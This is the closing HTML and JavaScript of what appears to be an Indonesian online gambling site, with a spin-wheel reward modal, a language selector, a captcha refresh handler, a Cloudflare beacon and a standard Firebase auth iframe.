                    window.loadOrRefreshTurnstileWidget('loginTurnstileWidget' ); 
                });
 
        });


        $("input").focus(function() {
          $("body").addClass("input-focused");
        });
        $("input").focusout(function() {
          $("body").removeClass("input-focused");
        });

        var host = window.location.host;        
        var curr_host = "Mercusuar77.gamer.gd/";
        var agent_url = "https://www.Goblin88.site/";
        

         if(false){             
            location.href = "https://www.Goblin88.site/";           
        }
        // popup banner
        var isLoggedIn = window.isAuth;
        var isClosedPopUp = isLoggedIn ? sessionStorage.getItem('isClosedPopUpAftLogin') : sessionStorage.getItem('isClosedPopUp');
        
        if(!isClosedPopUp){
                    }
</script>


<script defer="" type="text/javascript" src="/assets/js/firebase10d9.js"> </script>


 
  <div class="reward-program-popup"></div>
<div class="claimed-reward-popup"></div>
<div class="redeem-ticket-popup"></div>

<!-- spin-wheel modal -->
<div class="modal-wrapper nifty-modal fade-in-scale" id="spin-wheel-modal--layout" data-isnotcloseoverlay="true">
	<div class="md-content"> 
		<div class="md-body"> 
		<div class="modal-header text-center headerModal">
			<button class="btn btn-link closeBtn" id="btn-close--spin-wheel-modal"> X </button>
			</div>
			<div class="flex spinWheelWrapper text-center">
            <!-- spin-wheel type -->
            <input type="hidden" id="spin_wheel_type" value="">

              <div class="spinWheelTitle">Spin Wheel</div>
              <div>untuk mendapatkan koin atau lainnya</div>
              
              <div class="spinWheel">
                <div class=" inline-flex" style="position: relative;">
                  <canvas id="wheelCanvas" width="280" height="280"></canvas>
                  <div class="spinWheelArrow"></div>
                </div>
              </div>
            </div>
			<div class="flex" style=" place-content: center; ">
                <button class="btn btn-block btn-primary " id="spinBtn">
				 Coba Keberuntungan Anda                </button>
            </div>
        </div>
	</div>
</div>
<div class="md-overlay"></div>
<!-- end of spin-wheel modal -->
  <script type="text/javascript" src="/assets/js/ugsports/app_mobile.js"> </script>
  <!--License TNC Modal -->
<!--License TNC Modal -->

<!--Language Option Modal -->
<div class="nifty-modal slide-in-bottom " id="langModal-mobile">
  <div class="md-content">
    <div class="md-body">
      <div class="wrap language">
        <div class="title">Wilayah dan bahasa</div>
        <table class="table-borderless"> 
        
          <tbody><tr>
            <td class="country">Indonesia</td>
            <td></td>
            <td></td>
          </tr>
          <tr>
            <td class="flag-wrap">
              <div class="circle-id"></div>
            </td>
                        <td class="i  ">
            <a href="#" onclick="changeLang(&quot;id&quot;)"> indonesian</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;en&quot;)"> English</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;cn&quot;)"> Mandarin</a>
            </td>

                      </tr> 
     
        </tbody></table>
      </div>
    </div>
  </div>
</div>
<div class="md-overlay"></div>
<!--END Language Option Modal -->
 
<script>
$(document).ready(function () {
  });
 function changeLang(key){
      change_lang(key)
  }
  $('.btn-refresh-captcha').on( 'click', function(e){
e.preventDefault();
e.stopPropagation(); 
var $captchaImg = $(this).parent().find('img');
var curCapUrl = $captchaImg .attr("data-url");
var url = curCapUrl + Date.now() + Math.floor(Math.random() * 100000000);
$captchaImg.attr("src",url);

});



</script>





  

  <script type="text/javascript">
    $(document).ready(function(){
      if( window.location.href.indexOf('reLogin=yes') >= 0  &&  !window.isAuth){
        $("#btnToggleRSideNav").trigger('click');
      }
    });
  </script>

  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;2c468e4e28b1431db61c4f36ffcfe399&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>




<iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" tabindex="-1" vspace="0" width="100%" aria-hidden="true" id="I0_1770825139223" name="I0_1770825139223" src="https://api-kixplay-live1.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw&amp;appName=%5BDEFAULT%5D&amp;v=11.3.0&amp;eid=p&amp;usegapi=1&amp;jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.id.JlZG7ePi4xg.O%2Fd%3D1%2Frs%3DAHpOoo9bZCvgOq1E3JiiRDLsf0QN3hR_9A%2Fm%3D__features__#id=I0_1770825139223&amp;_gfid=I0_1770825139223&amp;parent=https%3A%2F%2FsemangatMERCUSUAR77.site&amp;pfname=&amp;rpctoken=36602874" style="position: absolute; top: -100px; width: 1px; height: 1px;"></iframe></body></html>